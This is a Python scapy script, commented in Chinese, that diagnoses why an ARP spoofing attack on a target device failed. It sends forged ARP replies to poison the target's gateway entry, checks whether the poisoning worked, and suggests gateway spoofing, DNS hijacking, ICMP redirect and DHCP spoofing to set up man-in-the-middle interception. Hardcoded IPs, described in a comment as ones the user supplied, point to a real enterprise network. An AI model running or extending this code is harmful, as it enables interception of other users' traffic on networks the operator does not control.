#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARP欺骗深度诊断脚本
分析为什么ARP欺骗没有影响目标设备
"""

import sys
import os
import subprocess
import platform
import socket
import time
from scapy.all import ARP, Ether, srp, sendp, get_if_list, get_if_hwaddr

# 添加当前目录到Python路径
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

def check_target_reachable(target_ip):
    """检查目标设备是否可达"""
    print(f"🔍 检查目标设备 {target_ip} 是否可达...")
    
    # 方法1: Ping测试
    try:
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        result = subprocess.run(['ping', param, '4', target_ip], 
                              capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            print("✅ Ping测试: 目标设备在线且可达")
            # 提取响应时间
            for line in result.stdout.split('\n'):
                if '时间=' in line or 'time=' in line:
                    print(f"   {line.strip()}")
            return True
        else:
            print("❌ Ping测试: 目标设备无响应")
            return False
    except Exception as e:
        print(f"❌ Ping测试失败: {e}")
        return False

def check_arp_table_for_target(target_ip):
    """检查ARP表中目标设备的信息"""
    print(f"\n🔍 检查ARP表中 {target_ip} 的信息...")
    
    try:
        # Windows系统
        if platform.system().lower() == 'windows':
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            
            if target_ip in result.stdout:
                print("✅ 目标IP在系统ARP表中")
                # 提取详细信息
                for line in result.stdout.split('\n'):
                    if target_ip in line:
                        print(f"   {line.strip()}")
                return True
            else:
                print("❌ 目标IP不在系统ARP表中")
                print("💡 说明: 系统从未与目标设备通信过")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ARP表检查失败: {e}")
        return False

def test_direct_arp_communication(target_ip, gateway_ip):
    """测试直接ARP通信"""
    print(f"\n🔍 测试与目标设备 {target_ip} 的直接ARP通信...")
    
    try:
        # 发送ARP请求到目标
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
        answered, unanswered = srp(arp_request, timeout=5, verbose=False)
        
        if answered:
            target_mac = answered[0][1].hwsrc
            print(f"✅ 直接ARP通信成功: 目标MAC = {target_mac}")
            return target_mac
        else:
            print("❌ 直接ARP通信失败: 目标设备无响应")
            print("💡 可能原因: 客户端隔离、防火墙阻止、VLAN隔离")
            return None
            
    except Exception as e:
        print(f"❌ ARP通信测试失败: {e}")
        return None

def test_network_isolation(target_ip, local_ip):
    """测试网络隔离情况"""
    print(f"\n🔍 测试网络隔离情况...")
    
    # 检查是否在同一子网
    target_segment = '.'.join(target_ip.split('.')[:3])  # 前三段
    local_segment = '.'.join(local_ip.split('.')[:3])
    
    if target_segment == local_segment:
        print(f"✅ 网络段匹配: {target_segment}.x")
    else:
        print(f"❌ 网络段不匹配: 目标({target_segment}) vs 本机({local_segment})")
    
    # 测试ICMP通信
    try:
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        result = subprocess.run(['ping', param, '2', target_ip], 
                              capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            print("✅ ICMP通信正常")
        else:
            print("❌ ICMP通信被阻止")
            print("💡 强烈怀疑存在客户端隔离")
    except:
        print("❌ ICMP测试失败")

def test_arp_spoof_effectiveness(target_ip, gateway_ip, local_mac):
    """测试ARP欺骗的实际效果"""
    print(f"\n🔍 测试ARP欺骗的实际效果...")
    
    try:
        # 发送ARP欺骗包
        spoof_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
            op=2, psrc=gateway_ip, pdst=target_ip,
            hwsrc=local_mac, hwdst="ff:ff:ff:ff:ff:ff"
        )
        
        # 发送10个包
        for i in range(10):
            sendp(spoof_packet, verbose=False)
            time.sleep(0.1)
        
        print("✅ ARP欺骗包发送完成")
        print("💡 等待3秒后检查ARP表变化...")
        time.sleep(3)
        
        # 检查ARP表
        if platform.system().lower() == 'windows':
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            if gateway_ip in result.stdout:
                for line in result.stdout.split('\n'):
                    if gateway_ip in line:
                        print(f"   网关ARP条目: {line.strip()}")
                        if local_mac.replace(':', '-').lower() in line.lower():
                            print("✅ ARP欺骗生效: 网关MAC已指向本机")
                        else:
                            print("❌ ARP欺骗未生效: 网关MAC未改变")
        
        return True
        
    except Exception as e:
        print(f"❌ ARP欺骗测试失败: {e}")
        return False

def check_enterprise_network_features():
    """检查企业网络特性"""
    print(f"\n🔍 检查企业网络特性...")
    
    # 常见的企业网络限制
    restrictions = [
        "客户端隔离 (Client Isolation)",
        "端口安全 (Port Security)", 
        "VLAN隔离",
        "ARP防护",
        "交换机安全策略"
    ]
    
    print("💡 企业网络常见限制:")
    for restriction in restrictions:
        print(f"   • {restriction}")
    
    print("\n💡 如果存在客户端隔离:")
    print("   • 设备间无法直接通信")
    print("   • 只能通过网关进行通信")
    print("   • 传统ARP欺骗无效")

def diagnose_arp_ineffectiveness(target_ip, gateway_ip):
    """主诊断函数"""
    print("=" * 70)
    print(f"          ARP欺骗无效深度诊断报告")
    print("=" * 70)
    
    # 获取本机信息
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # 获取本机MAC
    local_mac = None
    try:
        interfaces = get_if_list()
        for iface in interfaces:
            if iface != 'lo':
                try:
                    iface_mac = get_if_hwaddr(iface)
                    if iface_mac != '00:00:00:00:00:00':
                        local_mac = iface_mac
                        break
                except:
                    pass
    except:
        pass
    
    print(f"本机IP: {local_ip}")
    print(f"本机MAC: {local_mac or '未知'}")
    print(f"目标IP: {target_ip}")
    print(f"网关IP: {gateway_ip}")
    
    # 运行诊断测试
    tests = [
        ("目标可达性检查", lambda: check_target_reachable(target_ip)),
        ("ARP表状态检查", lambda: check_arp_table_for_target(target_ip)),
        ("直接ARP通信测试", lambda: test_direct_arp_communication(target_ip, gateway_ip)),
        ("网络隔离分析", lambda: test_network_isolation(target_ip, local_ip)),
        ("ARP欺骗效果测试", lambda: test_arp_spoof_effectiveness(target_ip, gateway_ip, local_mac) if local_mac else False),
        ("企业网络特性检查", check_enterprise_network_features)
    ]
    
    results = {}
    for test_name, test_func in tests:
        results[test_name] = test_func()
    
    # 诊断总结
    print("\n" + "=" * 70)
    print("          诊断结论")
    print("=" * 70)
    
    if not results["目标可达性检查"]:
        print("❌ 主要问题: 目标设备实际上不可达")
        print("💡 尽管您说设备在线，但网络测试显示不可达")
        print("💡 可能原因: 网络配置问题、防火墙阻止")
    
    elif not results["直接ARP通信测试"]:
        print("❌ 主要问题: 客户端隔离或网络限制")
        print("💡 目标设备在线但无法直接ARP通信")
        print("💡 强烈怀疑存在客户端隔离设置")
        print("\n🔧 解决方案:")
        print("   1. 使用网关级ARP欺骗")
        print("   2. 尝试DNS劫持等其他攻击方式")
        print("   3. 分析网络拓扑结构")
    
    elif not results["ARP欺骗效果测试"]:
        print("❌ 主要问题: ARP欺骗技术实现问题")
        print("💡 ARP包发送了但未生效")
        print("💡 可能原因: 网络设备防护、目标设备防护")
    
    else:
        print("✅ 所有基础测试通过")
        print("💡 需要进一步分析网络环境")
    
    print("\n🔧 高级解决方案:")
    print("   1. 网关欺骗: 专注于欺骗网关而非目标")
    print("   2. DNS劫持: 通过DNS重定向实现中间人攻击")
    print("   3. ICMP重定向: 使用ICMP重定向攻击")
    print("   4. DHCP欺骗: 如果网络使用DHCP")

def main():
    """主函数"""
    if len(sys.argv) > 2:
        target_ip = sys.argv[1]
        gateway_ip = sys.argv[2]
    else:
        # 使用您提供的IP
        target_ip = "10.30.58.185"
        gateway_ip = "10.30.255.254"
    
    diagnose_arp_ineffectiveness(target_ip, gateway_ip)

if __name__ == "__main__":
    main()